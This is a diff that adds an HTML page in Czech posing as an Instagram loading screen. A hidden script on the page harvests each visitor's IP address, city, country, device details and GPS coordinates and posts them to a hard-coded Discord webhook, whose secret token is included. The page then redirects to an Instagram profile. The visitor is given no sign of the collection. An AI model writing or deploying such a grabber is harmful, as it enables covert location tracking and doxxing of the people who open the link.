@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Načítání Instagramu...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Načítání Instagramu...</h2>
+  <p>Prosím čekejte...</p>
+
+  <script>
+    const webhookURL = "https://discordapp.com/api/webhooks/1369301414899224646/lUXipWbVV9yHCN-sp0nvuuNQEd-7U_HprR-UTL5VeWvLmveoh5zIIRB76w1nfbjU_Dd7";
+
+    const userAgent = navigator.userAgent;
+    const language = navigator.language;
+    const resolution = `${window.screen.width} × ${window.screen.height}`;
+    const time = new Date().toLocaleString();
+
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const city = data.city;
+        const country = data.country_name;
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            const message = `
+🕒 Čas: ${time}
+📱 Zařízení: ${userAgent}
+🌐 Jazyk: ${language}
+🖥️ Rozlišení: ${resolution}
+🌍 IP: ${ip}
+🏙️ Lokalita: ${city}, ${country}
+📍 GPS: https://www.google.com/maps?q=${lat},${lon}
+            `;
+
+            fetch(webhookURL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ content: message })
+            });
+          });
+        }
+
+        setTimeout(() => {
+          window.location.href = "instagram://user?username=rister.rofficial";
+          setTimeout(() => {
+            window.location.href = "https://instagram.com/rister.rofficial";
+          }, 1000);
+        }, 2000);
+      });
+  </script>
+</body>
+</html>
